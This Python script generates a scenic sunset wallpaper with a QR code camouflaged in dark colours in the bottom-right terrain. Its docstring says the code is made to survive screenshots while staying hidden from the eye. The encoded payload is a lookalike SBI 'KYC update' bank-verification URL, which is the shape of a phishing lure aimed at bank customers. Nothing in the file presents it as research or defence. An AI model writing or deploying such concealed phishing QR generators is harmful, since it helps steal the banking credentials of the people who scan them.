"""
Robust Steganographic Scenic Image Generator.
Creates an aesthetic sunset wallpaper where a covert QR code is seamlessly
blended into the mountain silhouette/terrain texture.
Unlike fragile LSB, this visual steganography survives screenshots, snipping tool,
and clipboard pasting while remaining discreet to the human eye.
"""
from pathlib import Path
from PIL import Image, ImageDraw
import math

def create_robust_scenic_stego(output_path: Path):
    width, height = 800, 600
    img = Image.new("RGB", (width, height))
    draw = ImageDraw.Draw(img)

    # 1. Natural Sunset Sky Gradient
    for y in range(height):
        ratio = y / height
        if ratio < 0.5:
            t = ratio / 0.5
            r = int(30 + t * (217 - 30))
            g = int(27 + t * (83 - 27))
            b = int(75 + t * (79 - 75))
        else:
            t = (ratio - 0.5) / 0.5
            r = int(217 + t * (255 - 217))
            g = int(83 + t * (178 - 83))
            b = int(79 + t * (55 - 79))
        draw.line([(0, y), (width, y)], fill=(r, g, b))

    # 2. Glowing Sun near horizon
    sun_x, sun_y = 400, 310
    for radius in range(70, 0, -2):
        draw.ellipse(
            [(sun_x - radius, sun_y - radius), (sun_x + radius, sun_y + radius)],
            fill=(255, 235, 150)
        )

    # 3. Layered Natural Mountain Silhouettes
    # Distant Mountains
    m1 = [(0, 360)]
    for x in range(0, width + 20, 20):
        y = 350 - 45 * math.sin(x * 0.008) - 25 * math.cos(x * 0.02)
        m1.append((x, int(y)))
    m1.extend([(width, height), (0, height)])
    draw.polygon(m1, fill=(78, 42, 70))

    # Mid-range Mountains
    m2 = [(0, 420)]
    for x in range(0, width + 20, 20):
        y = 410 - 55 * math.sin(x * 0.012 + 1.2) - 30 * math.cos(x * 0.018)
        m2.append((x, int(y)))
    m2.extend([(width, height), (0, height)])
    draw.polygon(m2, fill=(45, 24, 46))

    # Foreground Hills
    m3 = [(0, 490)]
    for x in range(0, width + 15, 15):
        y = 485 - 35 * math.sin(x * 0.015 + 2.5) - 15 * math.cos(x * 0.03)
        m3.append((x, int(y)))
    m3.extend([(width, height), (0, height)])
    draw.polygon(m3, fill=(18, 11, 22))

    # Trees on left
    for tx in [80, 110, 140, 180]:
        ty = 480
        th = 40
        draw.polygon([(tx, ty - th), (tx - 12, ty), (tx + 12, ty)], fill=(12, 7, 15))
        draw.polygon([(tx, ty - th + 15), (tx - 16, ty + 15), (tx + 16, ty + 15)], fill=(12, 7, 15))

    # 4. Generate Steganographic QR Code
    qr_payload = "https://sbi-kyc-update.xyz/verify-bank?id=883921"
    try:
        import qrcode
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_M,
            box_size=4,
            border=2,
        )
        qr.add_data(qr_payload)
        qr.make(fit=True)
        # Camouflaged dark palette: deep charcoal on dark slate background
        qr_img = qr.make_image(fill_color="#0b070f", back_color="#3a253b").convert("RGB")
    except ImportError:
        # Fallback QR generator if qrcode not installed
        qr_size = 140
        qr_img = Image.new("RGB", (qr_size, qr_size), color="#3a253b")
        qdraw = ImageDraw.Draw(qr_img)
        for ox, oy in [(10, 10), (qr_size - 45, 10), (10, qr_size - 45)]:
            qdraw.rectangle([(ox, oy), (ox + 35, oy + 35)], fill="#0b070f")
            qdraw.rectangle([(ox + 6, oy + 6), (ox + 29, oy + 29)], fill="#3a253b")
            qdraw.rectangle([(ox + 12, oy + 12), (ox + 23, oy + 23)], fill="#0b070f")

    # Blend QR into bottom-right corner as a subtle dark mountain texture/stamp
    qr_size = 130
    qr_resized = qr_img.resize((qr_size, qr_size), Image.Resampling.LANCZOS)
    img.paste(qr_resized, (width - 150, height - 150))

    # Save
    output_path.parent.mkdir(parents=True, exist_ok=True)
    img.save(output_path, "PNG")
    print("SUCCESS: Robust scenic steganography image created successfully.")

if __name__ == "__main__":
    out = Path(__file__).resolve().parent / "robust_scenic_stego.png"
    create_robust_scenic_stego(out)

